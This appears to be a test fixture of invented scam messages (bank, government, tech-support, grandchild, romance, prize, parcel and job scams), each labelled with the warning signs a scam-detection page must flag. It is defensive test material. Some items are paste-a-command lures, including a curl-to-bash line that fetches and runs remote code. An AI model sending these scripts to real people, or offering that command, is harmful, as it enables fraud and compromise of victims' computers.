@@ -1,0 +1,582 @@
+# Scam messages people receive, in English: texts, emails, chat messages and what a caller said, built from the US FTC's
+# scenarios (a bank's fraud team, the government, tech support, a grandchild in trouble, romance, a prize, a parcel, a
+# toll, a job, a buyer's code, the paste-a-command trick). Every one is made up: phone numbers are 555-01xx, links and
+# emails use example.com or example.invalid, and every person, bank and shop is invented. Some have typos and number
+# words on purpose, the way real ones do.
+# Each message starts with one label line, the warning signs Clotr's "Is this a scam?" page must find in it
+# (scam-signs.js), then the message:
+#   [signs: asks_code, press_rush, pret_bank]
+# Every listed sign must be found, and a sign the label doesn't list is a wrong one (tests/scam-signs.test.js, and the
+# scorecard). "Mentions your own details" (pret_knows_you) needs the person's vault, so it's tested on its own.
+# Messages are separated by lines of "---".
+---
+[signs: asks_code, press_rush, pret_bank]
+Anytown Bank Fraud Dept: we blocked a $940.00 charge at an electronics store. To stop it, reply with the 6-digit code we just sent you within 10 minutes.
+---
+[signs: asks_code, press_stay, pret_bank]
+Hi, this is Mark from the fraud team at Example Credit Union. Someone is trying to get into your online banking. Stay on the line and read me the verification code you just got.
+---
+[signs: asks_card_code, pret_bank]
+This is the fraud prevention team at Anytown Bank. To confirm you are the cardholder, please tell us the 3 numbers on the back of your card.
+---
+[signs: asks_code, press_secret, pret_bank]
+Fraud department here. We're texting you a one-time passcode now. Read it back to me so we can reverse the charge. Don't tell anyone at the branch, they are part of the investigation.
+---
+[signs: asks_card_code, press_rush, pret_bank]
+URGENT from the Anytown Bank security team: your debit card was used in another state. Reply now with the CVV on the back of your card to keep it active.
+---
+[signs: asks_code, pay_move_money, pret_bank]
+This is the fraud unit at Example Savings Bank. Your account has been compromised. We need to move your savings to a secure account to protect them. Tell me the code we just sent so I can set it up.
+---
+[signs: pay_move_money, press_rush, press_secret, pret_bank]
+Anytown Bank fraud investigator here. Criminals are inside your account right now. Transfer your balance to the safe account I give you immediately, and don't tell your family until this is over.
+---
+[signs: asks_details, pret_bank]
+Hello, I'm calling from the fraud department of your bank. Before we go on, please confirm your full card number and the expiration date.
+---
+[signs: asks_code, press_threat, pret_bank]
+Example Credit Union fraud alert: unusual login detected. Send us the sign-in code we texted you or your account will be locked today.
+---
+[signs: asks_details, press_rush, pret_bank]
+Anytown Bank Fraud Team: your online banking is on hold. Verify your username and password at anytown-bank.example.invalid within 24 hours.
+---
+[signs: asks_code, pret_bank]
+hi its the fraud team from your bank. we sent a code to ur phone to cancel the transfer, what does it say?
+---
+[signs: press_rush, prob_account]
+Anytown Bank: A transfer of $2,400.00 to J. Rivers is pending. If you did not make it, call our fraud team at (555) 555-0142 right away.
+---
+[signs: asks_details, press_threat, pret_bank]
+Anytown Bank Security: your card has been suspended for your protection. Confirm your Social Security number and date of birth by replying to this text, or the card will be closed for good.
+---
+[signs: asks_card_code, asks_code, pret_bank]
+This is Daniel with the Example Credit Union fraud team. I just need two things to stop the charges: the security code on the back of your card and the code we texted you.
+---
+[signs: asks_code, press_rush, press_threat, pret_bank]
+Fraud Prevention, Anytown Bank. We will freeze your account in 30 minutes unless you confirm the one-time code sent to your phone.
+---
+[signs: asks_code, pret_bank]
+Hello from the Example Credit Union fraud desk. To check it's really you, read me the code that just came to your phone.
+---
+[signs: asks_details, pay_move_money, press_secret, pret_bank]
+This is the security department at Anytown Bank. Someone at your branch is stealing from accounts. We'll help you move your money to a protected account. Give me your account number and keep this between us.
+---
+[signs: pay_hard_to_undo, press_rush, pret_bank]
+Anytown Bank Fraud Team: to reverse the fraudulent charge, wire $1,500 to our recovery account before 5 PM. The funds will be returned to you tonight.
+---
+[signs: asks_code, pret_bank]
+Text from Example Bank: A new device is signing in. If this wasn't you, reply to this message with the code you received so our fraud team can block it.
+---
+[signs: asks_card_code, press_rush, pret_bank]
+Anytown Bank card services, fraud check: what are the last 3 digits on the back of your card? Please answer ASAP so we can stop the transaction.
+---
+[signs: asks_code, press_secret, press_stay, pret_bank]
+This is Lisa from your bank's fraud team. Please don't hang up. I'm sending a code to your phone now, read it to me. And please don't mention this call to anyone, even bank staff.
+---
+[signs: asks_details, press_threat, pret_bank]
+Fraud alert from the Example Credit Union fraud team: your account will be closed unless you verify your personal information at example.invalid/verify.
+---
+[signs: pay_crypto, pay_move_money, press_secret, pret_bank]
+We are Anytown Bank's fraud department. Your money is not protected in the bank anymore. Withdraw it in cash and deposit it at a Bitcoin ATM to protect it. Do not tell the teller why.
+---
+[signs: asks_code, pret_bank]
+Example Bank Fraud Team: we need the 6-digit verification code sent to your mobile to confirm the refund.
+---
+[signs: asks_code, pret_bank]
+this is anytown bank fraud dept, pls tell me the six digit code we just txted u, its to stop the charge
+---
+[signs: asks_details, pret_bank]
+Anytown Bank anti-fraud team: please read me your card number and your PIN so I can cancel your old card and send a new one.
+---
+[signs: pay_hard_to_undo, pret_gov, press_threat]
+This is Officer Grant with the County Sheriff's Office. You missed jury duty and there is a warrant for your arrest. Pay the $2,300 bond by wire transfer to clear it.
+---
+[signs: asks_gift_card, pret_gov, press_rush, press_threat]
+IRS notice: you owe $1,874 in back taxes. To avoid arrest, pay with Google Play gift cards and call 1-800-555-0199 immediately with the card numbers.
+---
+[signs: asks_details, pret_gov, press_threat]
+Social Security Administration: your Social Security number has been suspended due to suspicious activity. Confirm your SSN to avoid legal action.
+---
+[signs: pay_crypto, pret_gov, press_secret, press_threat]
+This is Ross, calling from the Federal Bureau of Investigation. Your identity was used to launder money. To avoid being arrested, move your savings into Bitcoin and send it to the government wallet I give you. This case is confidential: do not discuss it with anyone.
+---
+[signs: asks_details, pret_gov]
+Medicare: you qualify for a new plastic card at no cost. Reply with your Medicare number and date of birth to have it mailed.
+---
+[signs: pay_hard_to_undo, pret_gov, press_rush, press_threat]
+U.S. Customs: a package addressed to you was seized with illegal items. Pay the $350 release fee by MoneyGram within 2 hours to avoid criminal charges.
+---
+[signs: asks_code, pret_gov]
+Hi, this is the Department of Motor Vehicles. To finish renewing your license online, please send us the verification code we just texted to you.
+---
+[signs: pay_hard_to_undo, pret_gov, press_stay, press_threat]
+This is the Social Security office. Your benefits will be stopped. Stay on the line while you go to the store and send $900 through Western Union to the person I name.
+---
+[signs: asks_details, pret_gov, press_rush]
+Tax refund notice from the IRS: you are owed $612.40. Provide your bank account and routing number at irs-refund.example.invalid within 48 hours to receive it.
+---
+[signs: asks_gift_card, pret_gov, press_secret, press_threat]
+Court clerk here. You failed to appear and a bench warrant was issued. You can settle it with $500 in Apple gift cards. Do not tell anyone about this call, it is a sealed case.
+---
+[signs: asks_details, pret_gov, press_threat]
+Immigration services: there is a problem with your file. Send a photo of your passport and your date of birth or your status will be cancelled.
+---
+[signs: pay_crypto, pret_gov, press_rush]
+IRS Criminal Investigation: you have an unpaid balance of $3,200. Pay now at the Bitcoin ATM nearest you and scan the QR code we send.
+---
+[signs: asks_details, pret_gov]
+Hello, I'm with the census office. We need your Social Security number and your bank account number to update our records.
+---
+[signs: pay_hard_to_undo, pret_gov, press_threat]
+This is the police. Your car was found at a crime scene. To avoid arrest you must pay a bond of $5,000 in cash to the courier we send to your home.
+---
+[signs: asks_code, pret_gov, press_threat]
+Message from the State Tax Department: your refund is blocked. Reply with the one time code sent to your phone or the refund will be cancelled.
+---
+[signs: pay_hard_to_undo, pret_gov, press_secret]
+US Marshals Service: you have an outstanding bond. Pay it by Zelle to the officer handling your case and do not speak to a lawyer, it will make it worse.
+---
+[signs: asks_details, pret_gov, press_rush]
+Department of Labor: your unemployment benefits are on hold. Verify your identity by replying with your full name, address and SSN. Act now to avoid delays.
+---
+[signs: pay_hard_to_undo, pret_gov]
+Hi, it's the toll authority. You have an unpaid toll of $4.15. Pay it with Cash App to $TollOffice so no late fee is added.
+---
+[signs: asks_details, pret_gov, press_threat]
+Jury duty office: you missed your summons. To avoid a fine of $1,000, confirm your date of birth and Social Security number by text.
+---
+[signs: pay_hard_to_undo, press_rush, press_threat, prob_account]
+Example Power & Light: your power will be shut off in 1 hour for nonpayment. Send $180 through Zelle immediately to keep service.
+---
+[signs: asks_gift_card, pret_gov, press_stay]
+Social Security fraud unit. Do not hang up. Go to the nearest store, buy three $500 Target gift cards and read me the numbers on the back.
+---
+[signs: asks_details, pret_gov]
+Hello from the Medicare benefits office. To send your new card we need your Medicare number and your bank details on file.
+---
+[signs: pay_crypto, pay_move_money, pret_gov, press_threat]
+Your Social Security number is linked to drug trafficking. To avoid arrest, convert your savings to cryptocurrency and send it to the federal wallet below for safekeeping.
+---
+[signs: asks_remote, pret_support]
+Microsoft Support: your computer sent us a virus alert. Install AnyDesk and tell me the 9-digit number on your screen so we can fix it.
+---
+[signs: asks_remote, press_rush, pret_support]
+WARNING! Your PC is infected with 3 viruses. Call Windows Technical Support at 1-888-555-0187 immediately and let our technician connect to your computer.
+---
+[signs: asks_remote, press_threat, pret_support]
+This is the Apple security team. Your iCloud was hacked. Download TeamViewer and give us access to your Mac, or all your photos will be deleted.
+---
+[signs: asks_details, pret_support]
+Tech support here, your computer has been compromised. To secure it I need your email password and your bank login.
+---
+[signs: asks_remote, pret_support]
+Hi, it's Kevin from PC Support Center. Your Windows license expired and your computer is at risk. Open Quick Assist and read me the code it shows.
+---
+[signs: asks_remote, pay_hard_to_undo, prob_account]
+Your antivirus subscription renewed for $399.99. If you did not authorize this, call our support team at (555) 555-0163. Our technician will need remote access to your computer to process the refund, then you send the difference by wire transfer.
+---
+[signs: asks_remote, pret_support]
+Hello, I am calling from the technical department of your internet provider. We detected hackers on your router. Go to example.invalid/fix and download the remote support tool so I can check your computer.
+---
+[signs: asks_command, pret_support]
+Microsoft Security: we found malware on your device. To remove it, press Windows key + R, paste the command we copied for you and press Enter.
+---
+[signs: asks_command]
+Verify you are human: press Win+R, then Ctrl+V, then press Enter to complete the check.
+---
+[signs: asks_command]
+To continue, prove you're not a robot. Open PowerShell, paste the text we put on your clipboard and press Enter.
+---
+[signs: asks_command, press_rush]
+Your browser is out of date and your files are at risk. Open Terminal on your Mac, paste this line and press return right now: curl -s https://example.invalid/fix | bash
+---
+[signs: asks_remote, pret_support, press_stay]
+This is Microsoft. Your computer is sending us error messages. Don't hang up. Go to example.invalid and type in the number I give you so I can get into your computer.
+---
+[signs: asks_card_code, asks_details, pret_support]
+PC Support Team: your laptop has a virus and we can remove it for $49.99. Please reply with your card number, expiry and the 3 digit code on the back.
+---
+[signs: asks_gift_card, pret_support]
+Windows Defender Support: your firewall has expired and hackers can see your files. To renew, buy two $100 Google Play cards and send us a photo of the back.
+---
+[signs: asks_remote, prob_account]
+Your Example Prime membership has been renewed for $249. To cancel, call 1-866-555-0121 and we'll help you install AnyDesk to stop the payment.
+---
+[signs: asks_remote, press_threat, pret_support]
+ALERT: Your computer has been locked due to suspicious activity. Call Apple Support at (555) 555-0175. Do not shut down your computer or your data will be lost. A technician will connect remotely to unlock it.
+---
+[signs: asks_details]
+Hi this is IT support. We're moving everyone to the new email system tonight, please reply with your username and password so I can move your mailbox.
+---
+[signs: asks_details, asks_remote, pret_support]
+Security alert from your computer's support team: your IP address was hacked. Let us connect to your PC and confirm your online banking login so we can check for damage.
+---
+[signs: asks_command, pret_support]
+Apple Support: your Mac is infected. Open Terminal, paste the command below and press Return to clean it.
+---
+[signs: pay_crypto, press_rush]
+We fixed your computer remotely, but our system refunded you $5,000 instead of $500 by mistake. You need to send back $4,500 in Bitcoin right now or I will lose my job.
+---
+[signs: asks_details, asks_remote, pret_support]
+SafePC Antivirus support: we detected a virus on your laptop. Please download UltraViewer from example.invalid and send me your ID and password.
+---
+[signs: asks_code, pret_support]
+Apple Support here. Your Apple ID is being used on another device, which means someone hacked it. Please tell me the verification code you just received so I can lock it.
+---
+[signs: asks_gift_card, press_secret, pret_family]
+Grandma, it's me. I'm in trouble and I can't tell Mom. Can you buy two $200 gift cards and send me the numbers on the back? I'll pay you back, I promise.
+---
+[signs: pay_hard_to_undo, press_rush, press_secret, pret_family]
+Grandpa it's Josh, I got arrested after a car accident and I need $3,000 for bail right now. Please wire it to my lawyer and don't tell Dad, he'll be so mad.
+---
+[signs: pay_hard_to_undo, press_secret, pret_family]
+This is attorney Paul Hendricks. Your grandson was in an accident and is being held. Bail is $8,500. A courier will come to your house to collect the cash. He asked that you not tell his parents.
+---
+[signs: pay_hard_to_undo, press_rush, pret_family]
+Mom this is my new number, my phone broke. I need to pay a bill urgently, can you Zelle me $850? I'll explain later.
+---
+[signs: pay_hard_to_undo, press_rush, pret_family]
+Hi Dad, I lost my phone and this is a friend's. I'm stuck at the airport and need $600 for a ticket home asap. Can you send it with Cash App to $StuckKid22?
+---
+[signs: asks_gift_card, press_secret, pret_family]
+Nana I'm in the hospital and they won't treat me until I pay. Get me some Apple gift cards, $500 total, and text me the codes. Please don't tell anyone, I'm embarrassed.
+---
+[signs: pay_hard_to_undo, press_stay, pret_family]
+Grandma? It's Emily... I'm in jail. Please don't hang up, the man here says you can send the bail money by Western Union.
+---
+[signs: pay_crypto, press_rush, pret_family]
+Hey Mom it's me, new number. I'm in trouble with some people I owe money. Can you send $2,000 in Bitcoin? They're giving me until tonight.
+---
+[signs: asks_gift_card, press_rush, pret_family]
+Auntie it's Marco, got in a car accident and my phone is cracked. The tow guy only takes gift cards. Please buy 3 Steam cards $100 each and send pics of the backs ASAP.
+---
+[signs: pay_hard_to_undo, press_secret, pret_family]
+Grandma, I'm on a trip and got arrested. The lawyer says if you send $4,000 by MoneyGram they'll let me go. Don't tell my parents please.
+---
+[signs: pay_hard_to_undo, pret_family]
+Mom it's Sarah, I'm using my friend's phone. I was in an accident, I'm ok but I need $1,200 for the hospital. Can you send it with Venmo to @Example-Kim?
+---
+[signs: asks_code, pret_family]
+hi mum it's me, changed my number. I'm locked out of my email, a code is coming to your phone in a sec, can you send it to me?
+---
+[signs: pay_hard_to_undo, press_rush, press_secret, pret_family]
+Grandpa, please help, I'm in jail in another state. I need you to go to the bank right now and take out $5,000 in cash. A man will pick it up. If the bank asks, say it's for a new roof.
+---
+[signs: pay_hard_to_undo, pret_family]
+Mom, my phone got stolen so I'm texting from this number. I owe my landlord rent today. Please send $900 by bank transfer to the account I give you.
+---
+[signs: asks_gift_card, press_rush, press_secret, pret_family]
+Grandma it's me Tyler, I'm in big trouble. I need you to buy some gift cards right away, $1,000 total. Don't tell anyone, not even Grandpa.
+---
+[signs: pay_hard_to_undo, pret_family]
+Dad, I'm stranded abroad, my wallet was stolen. Can you Western Union me $700 so I can get a hotel?
+---
+[signs: pay_hard_to_undo, press_secret, pret_family]
+Your nephew Daniel was arrested and asked me to call you. I'm his public defender. He needs $2,500 in cash for bail, and our courier can collect it from you. He's ashamed and asked you not to tell the family.
+---
+[signs: pay_crypto, pret_family]
+Hi Grandpa, it's Ben. I'm in trouble with some guys I owe money to. Can you put $1,500 in the Bitcoin machine at the gas station? I'll send you the QR code.
+---
+[signs: asks_code, pret_family]
+Mom it's me, I'm on a friend's phone, mine fell in the lake. Can you send me the 6 digit code that's about to come to your phone? I need it to get into my account.
+---
+[signs: pay_hard_to_undo, press_rush, press_secret, press_threat, pret_family]
+Grandma it's Lily, I crashed my friend's car and his dad will call the police unless I pay for the damage. Please send $1,800 through Zelle right now. Please don't tell my mom.
+---
+[signs: pay_hard_to_undo, pret_romance]
+My love, I can't wait until we finally meet. My bank account is frozen while I'm on the oil rig. Could you wire me $2,000 for the customs fee so I can come home to you?
+---
+[signs: asks_gift_card, pret_romance]
+Sweetheart, I'm deployed overseas and they don't let us use bank cards here. Can you buy me some iTunes cards so we can keep talking? Send me the codes, my love.
+---
+[signs: pay_crypto, pret_romance]
+Darling, I've been thinking about you all day. Before we meet in person, I want to show you how I made my money. Send $5,000 to my crypto trading account and you will double it in a week.
+---
+[signs: pay_hard_to_undo, press_secret, pret_romance]
+Honey, my camera is broken so we can't video call yet. I need $1,500 for my plane ticket to see you. Western Union is fastest. Please keep our love a secret from your kids, they won't understand.
+---
+[signs: pay_hard_to_undo, pret_romance]
+Babe, I'm stuck in customs with your gift. They want $3,000 before they'll release me. Can you send it through MoneyGram? Then we can finally be together.
+---
+[signs: pay_crypto, press_rush, pret_romance]
+My dear, my uncle's bitcoin investment app is doing amazing. Deposit $2,000 and we can buy our house together when I come home from the ship. Hurry, the bonus ends tonight.
+---
+[signs: asks_details]
+My love, I want to send you a gift from overseas but the courier needs your full name, home address and bank account number.
+---
+[signs: pay_hard_to_undo, press_secret, pret_romance]
+I know we've never met but I trust you more than anyone. I have a gold shipment stuck in customs and need $9,000 to release it. Send it by wire transfer and don't tell your family about us yet.
+---
+[signs: asks_gift_card, pret_romance]
+Hey beautiful, I'm stationed overseas and the military won't let me call. I need you to get Steam gift cards so I can pay for my leave papers. $500 total. Text me the codes.
+---
+[signs: pay_crypto, pret_romance]
+Since we can't meet yet, let's build our future. Download the app at example.invalid, buy USDT and send it to my wallet address: 0xEXAMPLE0000.
+---
+[signs: pay_hard_to_undo, press_rush, pret_romance]
+Sweetheart, I finally got my visa to come meet you! I'm $1,200 short for the flight and the airline closes the booking before tonight. Can you send it by Zelle?
+---
+[signs: pay_hard_to_undo, pret_romance]
+Darling, the hospital here won't treat me without payment and my accounts are frozen because I'm overseas. Please send $2,500 by Western Union. When we finally meet I will repay everything.
+---
+[signs: asks_gift_card, press_secret, pret_romance]
+My angel, I'm on a peacekeeping mission and can't use my cards. Buy me two $250 Google Play cards and send me the numbers. This must stay between us, my commander can't know.
+---
+[signs: pay_crypto, press_secret, pret_romance]
+We haven't met yet but you're my soulmate. My financial advisor showed me a crypto platform that pays 30% a month. Transfer your savings into it, and don't tell your bank, they hate crypto.
+---
+[signs: pay_hard_to_undo, press_rush, prob_prize]
+Congratulations! You won $1,000,000 in the Example National Lottery. To claim your prize, send a $500 processing fee by Western Union within 48 hours.
+---
+[signs: asks_details, prob_prize]
+You've been selected as our lucky winner of a free phone! Click example.invalid/claim and enter your card details to pay shipping.
+---
+[signs: asks_gift_card, prob_prize]
+Hi! You won the Example Store sweepstakes, a new car and $50,000. Taxes must be paid first: buy $900 in Apple gift cards and send us the codes.
+---
+[signs: pay_crypto, press_rush, prob_prize]
+CONGRATS!! Your wallet won 2 BTC in our anniversary giveaway. Send 0.1 BTC to verify your wallet and receive your prize. Offer ends in 1 hour.
+---
+[signs: asks_details, press_rush, prob_prize]
+Example Mart reward: you are today's winner! Confirm your name, address and card number at examplemart.example.invalid in the next 15 minutes to get your $500 reward.
+---
+[signs: pay_hard_to_undo, prob_prize]
+Dear winner, your email was picked in the international lottery draw. Your prize of $850,000 is ready. Wire the $1,200 transfer fee to release the funds.
+---
+[signs: asks_details, prob_prize]
+You've won a free cruise for two! To book, just reply with your date of birth and Social Security number for the travel paperwork.
+---
+[signs: asks_gift_card, press_secret, prob_prize]
+Prize office: you won $2.5 million. Keep this confidential until the award is delivered. To cover insurance, buy 4 Target gift cards of $250 and read me the numbers.
+---
+[signs: pay_hard_to_undo, press_rush, prob_prize]
+Congratulations, you are the lucky winner of our holiday raffle! Pay the $79 delivery fee through Cash App to receive your TV. Unclaimed prizes expire at midnight.
+---
+[signs: asks_code, prob_prize]
+You won a $100 Example Store gift card! To claim it, reply with the 6-digit verification code we just sent to your phone.
+---
+[signs: asks_details, pret_gov, prob_prize]
+Winner notification: you have been chosen to receive a government grant of $9,000. To claim, send your bank account and routing numbers.
+---
+[signs: pay_crypto, prob_prize]
+Lucky draw result: you won 5,000 USDT! Pay the 50 USDT unlock fee to the wallet below to withdraw your winnings.
+---
+[signs: pay_hard_to_undo, prob_prize]
+You've been selected for a $15,000 relief grant. A small fee of $250 is required. Send it with Venmo to @Grant-Office.
+---
+[signs: prob_account]
+Example Parcel: your package could not be delivered due to an incomplete address. Update it here: example-parcel.example.invalid/redeliver
+---
+[signs: press_rush, prob_account]
+Final notice: your parcel is on hold at our warehouse. Pay the $1.99 redelivery fee within 12 hours at example.invalid/pay or it will be returned.
+---
+[signs: press_rush, press_threat, prob_account]
+Toll Services: you have an unpaid toll balance of $6.80. Pay now at toll-pay.example.invalid to avoid a late fee and suspension of your driver's license.
+---
+[signs: asks_details, prob_account]
+Your Example Express delivery failed. To reschedule, confirm your address and card details at example.invalid/track.
+---
+[signs: prob_account]
+We tried to deliver your package today but no one was home. Book a new time here: example.invalid/r/88KD
+---
+[signs: pay_hard_to_undo, pret_gov]
+Customs notice: your international parcel is held until import duty of $24.50 is paid. Send the payment by Zelle to customs-desk@example.com.
+---
+[signs: press_rush, prob_account]
+Your package has been held at the depot. Please reply Y and click the link to release it: example.invalid/d/2q. Respond within 24 hours.
+---
+[signs: asks_card_code, press_rush, prob_account]
+Example Shop: there is a problem with your order. To release it, reply with the 3 numbers on the back of your card within 1 hour.
+---
+[signs: asks_code]
+Your parcel needs a delivery confirmation. We sent a 6 digit code to your phone, reply with it to confirm delivery.
+---
+[signs: asks_details, prob_account]
+ALERT: Multiple delivery attempts failed. Your item will be returned to sender. Confirm your details: example.invalid/c
+---
+[signs: pay_hard_to_undo, press_rush, prob_account]
+Example Courier: a package for you is waiting with $3.00 unpaid shipping. Pay with Cash App immediately to $ExampleCourier or it goes back.
+---
+[signs: press_rush, press_threat, prob_account]
+FINAL WARNING: Your toll account is overdue. Pay $11.69 at example.invalid by 11:59 PM tonight or face legal action.
+---
+[signs: prob_account]
+Hi, this is Example Post. Your parcel was stopped because the house number is missing. Reply 1 to get the link to fix it.
+---
+[signs: asks_details, press_rush, prob_account]
+Your delivery is suspended because of unpaid customs fees. Act now: update your payment information at example.invalid/pay
+---
+[signs: asks_details, press_threat]
+Example Mail: your mailbox is almost full and will be deactivated. Log in at example.invalid/keep to verify your password.
+---
+[signs: asks_details, prob_account]
+Example Pay: we noticed suspicious activity on your account. Please confirm your identity by sending a photo of your driver's license and your SSN.
+---
+[signs: press_rush, press_threat, prob_account]
+Your Example Streaming payment was declined. Fix your billing within 24 hours to avoid losing access: example.invalid/billing
+---
+[signs: asks_code, prob_account]
+Someone tried to sign in to your Example account from a new device. If it wasn't you, reply with the code we sent to your email to block them.
+---
+[signs: asks_details, press_threat, prob_account]
+Example Cloud: your storage payment failed and your photos will be deleted. Re-enter your card number at example.invalid/storage to keep them.
+---
+[signs: asks_details, prob_account]
+Example Bank Online: your access has been limited. Sign in with your username and password at example.invalid/unlock to restore it.
+---
+[signs: asks_details, press_rush, press_threat, prob_account]
+Your Example ID has been locked for security reasons. Verify your date of birth and answer your security questions within 12 hours or it will be permanently deleted.
+---
+[signs: asks_code]
+Example Wallet: To complete your refund of $129.00, send us the one-time PIN you just received. Expires in 5 minutes.
+---
+[signs: asks_details]
+Hi, HR here. Please reply with your Social Security number and bank details so we can set up direct deposit for your new job.
+---
+[signs: asks_code, asks_details]
+Example Mail Support: to keep your account, send us your backup codes and the answer to your security question.
+---
+[signs: asks_code, prob_account]
+Your Example Shop account was used to order a $1,299 laptop. If you did not place this order, reply STOP and give us the code we text you.
+---
+[signs: press_threat, prob_account]
+Example Phone: your account is past due. Click here to avoid disconnection: example.invalid/pay
+---
+[signs: asks_details, prob_account]
+Example Streaming: we couldn't process your payment. Please update your payment details here to keep watching: example.invalid/up
+---
+[signs: asks_card_code, press_threat, prob_account]
+Example Hotel booking: your reservation will be cancelled because your card was declined. Reply with the CVV to keep it.
+---
+[signs: asks_code]
+Hi, is the bike still for sale? Before I come, I need to check you're real. I'm sending you a code, just tell me what it says.
+---
+[signs: asks_code]
+I want to buy your couch. To make sure you're not a scammer, I'll send a Google Voice code to your number. Please send it back to me.
+---
+[signs: asks_code]
+Hey, I accidentally sent my WhatsApp code to your number, can you forward it to me? It's 6 digits.
+---
+[signs: pay_hard_to_undo]
+Remote job offer: you're hired as an assistant! We'll mail you a check for $2,800. Deposit it, keep $300 and send the rest by Zelle to our supplier.
+---
+[signs: asks_details]
+Job offer: earn $500 a day working from home! To start, send your Social Security number and a photo of your ID.
+---
+[signs: pay_crypto]
+Crypto investment: double your money in 7 days, guaranteed. Send any amount of Bitcoin to the wallet address below and we'll return twice as much.
+---
+[signs: pay_crypto, press_rush]
+Hi, I'm Anna from the investment group. Our members made 300% last month. Deposit at least $1,000 in USDT to lock in your spot. Spots close in 2 hours.
+---
+[signs: asks_code]
+Your Example account recovery: someone will call you. When they ask, read them the code we text you.
+---
+[signs: asks_gift_card, press_rush]
+From your boss: Are you free? I need a favor. Buy 5 Apple gift cards at $100 each for a client right now and send me pictures of the codes. I'll pay you back.
+---
+[signs: asks_gift_card, press_secret]
+It's Pastor James. I'm in a meeting and can't talk. I need you to get some Google Play cards for the church charity, $400. Keep this between us, it's a surprise for the congregation.
+---
+[signs: asks_code, press_secret]
+Its me Jen from church, i'm locked out of my account and need help. A code was just sent to your phone by mistake, can u send it to me? dont tell anyone pls
+---
+[signs: pay_hard_to_undo, pret_gov, press_threat]
+Fedral Government notice: a warrent has been issued in your name. Pay the bond by wire transfer to avoid being arested.
+---
+[signs: asks_card_code, press_rush, prob_account]
+Hello from Example Shop. Your order is on hold. Reply with the three numbers on the back of your card immediatly.
+---
+[signs: asks_code, press_rush]
+hello its Example Pay support, ur refund is ready. tell me the four five six digit... sorry, the six-digit code we texted you, quickly before it expires
+---
+[signs: asks_gift_card, pret_gov, press_threat]
+This is the tax office. You owe a penalty and you must pay it in gift cards today. Buy $600 worth of Google Play cards and call us back with the numbers, or the police will come to your house.
+---
+[signs: asks_details, pret_support]
+Hello, this is the Windows help desk. Your computer is infected with spyware. To protect your bank, please tell me your online banking username and password.
+---
+[signs: pay_hard_to_undo, press_secret, pret_gov]
+Officer Diaz, Police Department. Your son is a suspect in a case. You can settle it today by sending $2,000 by wire transfer. Do not talk to anyone about this, not even your son.
+---
+[signs: asks_remote, pret_support]
+Dear customer, your computer has a serious error. Our Microsoft certified technician will fix it for free if you allow us remote access to your PC.
+---
+[signs: asks_code, press_rush, prob_account]
+Your Example Pay account has been temporarily limited. To restore it, reply now with the confirmation code sent to your phone.
+---
+[signs: pay_hard_to_undo, pret_romance]
+I feel like I've known you forever even though we've never met. My daughter is sick and I can't reach my money from overseas. Could you send $800 by Western Union? I'll pay you back the moment I land.
+---
+[signs: pay_hard_to_undo, press_secret, press_threat]
+I have videos of you from your webcam. Send $1,000 in gold bars or cash in a box to the address I give you, or I share them with all your contacts. Tell no one.
+---
+[signs: asks_details, press_rush, prob_prize]
+URGENT: you have a $750 reward waiting. To receive it today, reply with your full card number and the expiry date. This offer expires tonight.
+---
+[signs: asks_gift_card, pret_support]
+Example Tech Support: your laptop is infected and your warranty is over. The repair fee is $300, payable only in Apple gift cards. Read us the numbers on the back once you have them.
+---
+[signs: asks_code, pret_gov]
+This is the Social Security office calling about your benefits. We sent you a verification code by text, please read it back to me.
+---
+[signs: pay_crypto, pret_gov, press_rush, press_threat]
+Sheriff's Department: your arrest warrant can be cancelled if you pay $1,500 at a Bitcoin ATM within the hour. Keep the receipt.
+---
+[signs: asks_details, prob_account]
+Example Shop: your account is locked after 3 failed sign-in attempts. Reply with your username and the answer to your security question to unlock it.
+---
+[signs: asks_code, pret_bank]
+Hi, this is Anytown Bank's fraud department. We need to check a transaction. Can you read me the passcode we just sent to your phone?
+---
+[signs: asks_gift_card, press_rush]
+I'm stuck in a meeting. Need you to grab 4 Apple gift cards ($100 each) right now and email me the codes.
+---
+[signs: pay_hard_to_undo, press_threat, pret_gov]
+This is the Social Security Administration. Your benefits will be suspended unless you send $500 by MoneyGram.
+---
+[signs: asks_remote, pret_support]
+Microsoft Support here, your PC is infected. Please download AnyDesk so our technician can fix it.
+---
+[signs: prob_account]
+Your Example Streaming account has been suspended. Click here to update: example.invalid/x
+---
+[signs: asks_details, prob_prize]
+Congratulations! You've won a $1,000 gift card. Reply with your full name and card number to claim.
+---
+[signs: asks_code]
+Hey it's Sam from the marketplace. I'm sending you a verification code, just send it back to me so I know you're legit.
+---
+[signs: pay_hard_to_undo, press_secret, pret_family]
+Grandpa, it's Mia. I got arrested and need $2,000 for bail. Please send it by Western Union and don't tell Mom.
+---
+[signs: asks_card_code, press_rush, prob_account]
+Your order is on hold. Reply within 2 hours with the CVV on the back of your card.
+---
+[signs: asks_code, pret_family]
+Mom, I'm locked out of my account. You'll get a 6 digit code, can you send it to me?
+---
+[signs: pay_crypto, press_threat, pret_gov]
+FBI notice: to avoid arrest, deposit $3,000 at a Bitcoin ATM today.
+---
+[signs: asks_details, pret_bank]
+Anytown Bank fraud team: please confirm your date of birth and the last 4 of your Social Security number.
+---
+[signs: asks_command]
+To show you are human, press Windows + R, paste with Ctrl+V and hit Enter.
+---
+[signs: pay_hard_to_undo, pret_romance]
+Darling, I'm deployed overseas and need $800 for my leave. Can you send it through Zelle?
+---
+[signs: asks_details, press_rush, press_threat, prob_account]
+Dear Customer,
+
+We were unable to process your latest payment. Your account will be suspended within 48 hours unless you update your billing information.
+
+Please log in at example-billing.example.invalid and verify your card details to avoid interruption.
+
+Thank you,
+Example Streaming Billing Team
+---
+[signs: asks_gift_card, press_secret, press_stay, press_threat, pret_gov]
+This is Officer Mark Davis with the Sheriff's Office. There is a warrant for your arrest for missing jury duty. You can resolve it today by paying the fine with gift cards. Go to the store, buy $1,500 in Google Play cards and stay on the line with me. Do not discuss this with anyone, it's a confidential matter.
